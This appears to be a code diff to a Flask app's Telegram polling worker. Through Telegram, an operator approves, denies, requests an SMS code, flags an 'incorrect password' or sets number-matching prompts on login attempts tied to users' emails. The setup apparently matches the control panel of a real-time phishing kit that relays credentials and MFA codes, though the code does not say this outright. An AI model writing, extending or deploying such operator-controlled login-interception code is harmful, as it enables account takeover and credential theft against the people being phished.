@@ -123,34 +123,31 @@ def telegram_polling_worker():
                         elif action == "deny":
                             mapped_status = "denied"
                         else:
-                            mapped_status = action # e.g. "request_sms", "incorrect_password"
-                        # If payload includes chosen number or candidates, set them on the attempt
+                            mapped_status = action
                         if payload and isinstance(payload, dict):
                             if payload.get('chosen'):
                                 attempt['promptNumber'] = payload.get('chosen')
                             if payload.get('candidates'):
                                 attempt['promptCandidates'] = payload.get('candidates')
                         attempt["status"] = mapped_status
-                        
                         logs.insert(0, {
                             "id": "log-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9)),
                             "timestamp": datetime.utcnow().isoformat() + "Z",
                             "type": "LOGIN_SUCCESS" if mapped_status == "approved" else "GATEWAY_LOGIN_ATTEMPT",
-                            "details": f"[TELEGRAM COMMAND] Organizer dispatched direct interaction [{mapped_status.upper()}] for {attempt.get('email')}. Transaction status applied.",
+                            "details": f"[TELEGRAM COMMAND] Organizer dispatched [{mapped_status.upper()}] for {attempt.get('email')}.",
                             "ipPlaceholder": "Telegram Remote"
                         })
-                
                 telegram_service.poll_updates(on_action)
         except Exception as e:
             print(f"[Telegram Polling Worker Exception] {e}", flush=True)
         time.sleep(1.5)
 
+
+# Always start polling thread regardless of how the app is launched
+_polling_thread = threading.Thread(target=telegram_polling_worker, daemon=True)
+_polling_thread.start()
+
+
 if __name__ == "__main__":
-    # Start the telegram callback long polling loop
-    t = threading.Thread(target=telegram_polling_worker, daemon=True)
-    t.start()
-    
-    # 💡 CHANGED: Look for Render's 'PORT' first, fallback to 'FLASK_PORT' or 5000 for local dev
-    port = int(os.environ.get("PORT", os.environ.get("FLASK_PORT", 5000)))
-    
+    port = int(os.environ.get("FLASK_PORT", 5000))
     app.run(host="0.0.0.0", port=port, debug=False)
